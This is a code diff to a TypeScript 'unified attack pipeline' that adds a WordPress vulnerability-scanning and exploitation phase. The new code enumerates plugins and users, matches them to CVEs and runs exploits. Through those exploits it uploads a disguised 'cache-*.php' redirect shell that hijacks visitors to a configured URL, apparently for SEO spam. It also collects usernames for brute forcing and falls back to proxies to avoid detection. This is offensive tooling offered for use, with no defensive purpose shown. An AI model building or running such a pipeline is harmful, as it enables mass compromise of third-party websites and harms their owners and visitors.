@@ -37,6 +37,7 @@ import { findOriginIP, type OriginIPResult } from "./cf-origin-bypass";
 import { wpBruteForce, wpAuthenticatedUpload, type BruteForceResult, type WPCredentials } from "./wp-brute-force";
 import { createAttackLogger, type AttackLogger } from "./attack-logger";
 import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimalRetryCount, formatFallbackPlan, type TargetProfile, type FallbackPlan } from "./smart-fallback";
+import { runWpVulnScan, executeExploit, type WpScanResult, type WpVulnerability } from "./wp-vuln-scanner";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -160,6 +161,8 @@ export interface PipelineResult {
   detectionScan?: { detections: any[]; liveChecks: any[] } | null;
   // Comprehensive attack vectors (29 additional vectors)
   comprehensiveResults?: AttackVectorResult[] | null;
+  // WP Vulnerability Scan (WPScan-style)
+  wpVulnScan?: WpScanResult | null;
 }
 
 type EventCallback = (event: PipelineEvent) => void;
@@ -189,16 +192,31 @@ async function followRedirectChain(startUrl: string, maxHops = 10): Promise<{ ch
 
   for (let i = 0; i < maxHops; i++) {
     try {
-      const targetDomain = currentUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
-      const { response: resp } = await fetchWithPoolProxy(currentUrl, {
-        method: "GET",
-        redirect: "manual",
-        headers: {
-          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-          "Referer": "https://www.google.com/search?q=test",
-        },
-        signal: AbortSignal.timeout(8000),
-      }, { targetDomain, timeout: 8000 });
+      // Direct fetch first for speed, proxy fallback
+      let resp: Response;
+      try {
+        resp = await fetch(currentUrl, {
+          method: "GET",
+          redirect: "manual",
+          headers: {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Referer": "https://www.google.com/search?q=test",
+          },
+          signal: AbortSignal.timeout(8000),
+        });
+      } catch {
+        const targetDomain = currentUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, "");
+        const proxyResult = await fetchWithPoolProxy(currentUrl, {
+          method: "GET",
+          redirect: "manual",
+          headers: {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Referer": "https://www.google.com/search?q=test",
+          },
+          signal: AbortSignal.timeout(8000),
+        }, { targetDomain, timeout: 8000 });
+        resp = proxyResult.response;
+      }
       finalStatus = resp.status;
 
       if (resp.status >= 300 && resp.status < 400) {
@@ -1268,6 +1286,137 @@ export async function runUnifiedAttackPipeline(
         step: "error",
         detail: `⚠️ WP Brute Force ล้มเหลว: ${error.message}`,
         progress: 48,
+      });
+    }
+  }
+
+  // ─── Phase 2.6: WP Vulnerability Scan (WPScan-style) + Exploit Execution ───
+  let wpVulnScanResult: WpScanResult | null = null;
+
+  if (!shouldStop('wp_vuln_scan') && !hasSuccessfulRedirect()) {
+    loggedOnEvent({
+      phase: "wp_vuln_scan" as any,
+      step: "start",
+      detail: `🔍 Phase 2.6: WP Vuln Scan — Plugin/Theme enumeration + CVE matching (WPScan-style)...`,
+      progress: 49,
+    });
+
+    try {
+      wpVulnScanResult = await Promise.race([
+        runWpVulnScan(config.targetUrl, (phase, detail, progress) => {
+          loggedOnEvent({
+            phase: "wp_vuln_scan" as any,
+            step: phase,
+            detail: `🔍 ${detail}`,
+            progress: 49 + Math.round(progress * 0.06),
+          });
+        }),
+        new Promise<WpScanResult>((_, reject) => setTimeout(() => reject(new Error("WP Vuln Scan timeout")), 120000)),
+      ]);
+
+      if (wpVulnScanResult.isWordPress) {
+        const exploitableVulns = wpVulnScanResult.vulnerabilities.filter(v => v.exploitAvailable);
+        aiDecisions.push(`🔍 WP Vuln Scan: ${wpVulnScanResult.plugins.length} plugins, ${wpVulnScanResult.vulnerabilities.length} vulns (${exploitableVulns.length} exploitable)`);
+
+        loggedOnEvent({
+          phase: "wp_vuln_scan" as any,
+          step: "results",
+          detail: `🔍 WP Vuln Scan: ${wpVulnScanResult.plugins.length} plugins found, ${wpVulnScanResult.vulnerabilities.length} potential vulnerabilities, ${exploitableVulns.length} with exploits, ${wpVulnScanResult.users.length} users, ${wpVulnScanResult.interestingFindings.length} findings`,
+          progress: 53,
+          data: {
+            plugins: wpVulnScanResult.plugins.map(p => `${p.slug}${p.version ? ` v${p.version}` : ''}`),
+            vulns: wpVulnScanResult.vulnerabilities.map(v => `${v.plugin}: ${v.title} (${v.severity})`),
+            users: wpVulnScanResult.users,
+            findings: wpVulnScanResult.interestingFindings,
+          },
+        });
+
+        // Execute exploits for file_upload and rce vulnerabilities
+        if (exploitableVulns.length > 0 && !hasSuccessfulRedirect()) {
+          loggedOnEvent({
+            phase: "wp_vuln_scan" as any,
+            step: "exploiting",
+            detail: `💥 Executing ${exploitableVulns.length} exploits (${exploitableVulns.map(v => v.cve || v.title).join(', ')})...`,
+            progress: 54,
+          });
+
+          const redirectShell = `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
+
+          for (const vuln of exploitableVulns) {
+            if (hasSuccessfulRedirect()) break;
+            try {
+              const exploitResult = await executeExploit(
+                config.targetUrl,
+                vuln,
+                `cache-${Math.random().toString(36).slice(2, 8)}.php`,
+                redirectShell,
+              );
+
+              if (exploitResult.success && exploitResult.uploadedUrl) {
+                aiDecisions.push(`💥 CVE Exploit SUCCESS: ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl}`);
+
+                // Verify the uploaded file
+                const verification = await verifyUploadedFile(exploitResult.uploadedUrl, config.redirectUrl, onEvent);
+                uploadedFiles.push({
+                  url: exploitResult.uploadedUrl,
+                  shell: { type: "redirect_php", content: redirectShell, filename: "cve-exploit.php", contentType: "application/x-php", description: `${vuln.cve || vuln.title}`, id: `cve_${Date.now()}`, targetVector: "wp_vuln_scan", bypassTechniques: ["cve_exploit"], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                  method: `cve_exploit_${vuln.plugin}`,
+                  verified: verification.verified,
+                  redirectWorks: verification.redirectWorks,
+                  redirectDestinationMatch: verification.redirectDestinationMatch,
+                  finalDestination: verification.finalDestination,
+                  httpStatus: verification.httpStatus,
+                  redirectChain: verification.redirectChain,
+                });
+
+                loggedOnEvent({
+                  phase: "wp_vuln_scan" as any,
+                  step: "exploit_success",
+                  detail: `✅ CVE Exploit สำเร็จ! ${vuln.cve || vuln.title} → ${exploitResult.uploadedUrl} (verified: ${verification.verified}, redirect: ${verification.redirectWorks})`,
+                  progress: 55,
+                  data: { vuln, exploitResult, verification },
+                });
+              } else {
+                loggedOnEvent({
+                  phase: "wp_vuln_scan" as any,
+                  step: "exploit_failed",
+                  detail: `⚠️ ${vuln.cve || vuln.title}: ${exploitResult.details}`,
+                  progress: 54,
+                });
+              }
+            } catch (exploitErr: any) {
+              loggedOnEvent({
+                phase: "wp_vuln_scan" as any,
+                step: "exploit_error",
+                detail: `⚠️ Exploit error (${vuln.plugin}): ${exploitErr.message}`,
+                progress: 54,
+              });
+            }
+          }
+        }
+
+        // If WP users were found but brute force wasn't run, add them to discoveredCredentials
+        if (wpVulnScanResult.users.length > 0 && !wpBruteForceResult) {
+          for (const user of wpVulnScanResult.users) {
+            discoveredCredentials.push({ type: 'wp_user', username: user });
+          }
+        }
+      } else {
+        aiDecisions.push(`🔍 WP Vuln Scan: Target is not WordPress — skipped`);
+        loggedOnEvent({
+          phase: "wp_vuln_scan" as any,
+          step: "not_wp",
+          detail: `ℹ️ Target is not WordPress — WP Vuln Scan skipped`,
+          progress: 55,
+        });
+      }
+    } catch (error: any) {
+      errors.push(`WP Vuln Scan error: ${error.message}`);
+      loggedOnEvent({
+        phase: "wp_vuln_scan" as any,
+        step: "error",
+        detail: `⚠️ WP Vuln Scan error: ${error.message}`,
+        progress: 55,
       });
     }
   }
@@ -2839,6 +2988,7 @@ export async function runUnifiedAttackPipeline(
     // Detection scan
     detectionScan: detectionScanResult || undefined,
     comprehensiveResults: comprehensiveResults.length > 0 ? comprehensiveResults : undefined,
+    wpVulnScan: wpVulnScanResult || undefined,
   };
 
   if (fullSuccess) {
